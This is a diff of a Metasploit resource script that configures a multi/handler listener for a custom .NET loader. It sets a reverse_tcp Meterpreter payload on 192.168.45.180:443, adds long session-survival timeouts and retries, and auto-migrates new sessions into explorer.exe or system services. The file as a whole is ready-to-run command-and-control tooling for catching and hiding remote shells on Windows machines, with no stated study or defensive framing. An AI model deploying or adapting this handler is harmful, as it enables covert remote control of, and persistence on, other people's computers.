@@ -1,14 +1,25 @@
 # handler.rc — multi/handler for the custom .NET loader
 # Load with:  msfconsole -q -r handler.rc
-# Edit LHOST/LPORT/PAYLOAD to match what you built with build.sh
+# Edit LHOST/LPORT/PAYLOAD to match what you built with build.sh.
 
 use exploit/multi/handler
-set PAYLOAD windows/x64/meterpreter/reverse_https
-set LHOST 0.0.0.0
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.45.180
 set LPORT 443
 set EXITFUNC thread
+
+# --- session survival ---
 set ExitOnSession false
-set AutoRunScript post/windows/manage/migrate
-set HandlerSSLCert ""
 set StagerVerifySSLCert false
+set SessionCommunicationTimeout 600
+set SessionExpirationTimeout 604800
+set SessionRetryTotal 3600
+set SessionRetryWait 10
+
+# --- auto-migrate into an EXISTING process (safer than spawning) ---
+# Fires once the session is fully established. Migrates into explorer.exe
+# by name if it exists, otherwise falls back to spoolsv/svchost.
+# Comment out entirely if you'd rather migrate by hand.
+set InitialAutoRunScript "multi_console_command -cl 'migrate -N explorer.exe'"
+
 exploit -j -z
